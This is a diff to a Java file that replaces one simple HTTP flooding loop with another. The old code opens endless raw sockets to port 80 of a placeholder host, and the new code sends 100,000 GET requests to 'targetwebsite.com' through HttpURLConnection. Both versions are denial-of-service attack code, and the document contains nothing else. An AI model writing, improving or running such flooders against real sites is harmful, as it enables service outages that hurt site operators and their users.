@@ -1,17 +1,30 @@
 import java.net.*;
-import java.io.*;
 
 public class Main {
-    public static void main(String[] args) throws Exception {
-        String target = "target.website.com";
-        int port = 80;
-        while (true) {
-            Socket socket = new Socket(target, port);
-            OutputStream out = socket.getOutputStream();
-            out.write(("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n").getBytes());
-            out.flush();
-            out.close();
-            socket.close();
+    public static void main(String[] args) {
+        // Establish target URL
+        String target = "https://www.targetwebsite.com/";
+
+        // Set up number of requests to send
+        int requests = 100000;
+
+        // Begin sending requests
+        for (int i = 0; i < requests; i++) {
+            try {
+                // Create URL object for target website
+                URL url = new URL(target);
+
+                // Open connection to target website
+                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+
+                // Set request method to GET
+                connection.setRequestMethod("GET");
+
+                // Send request
+                connection.getResponseCode();
+            } catch (Exception e) {
+                System.out.println("Error: " + e);
+            }
         }
     }
 }
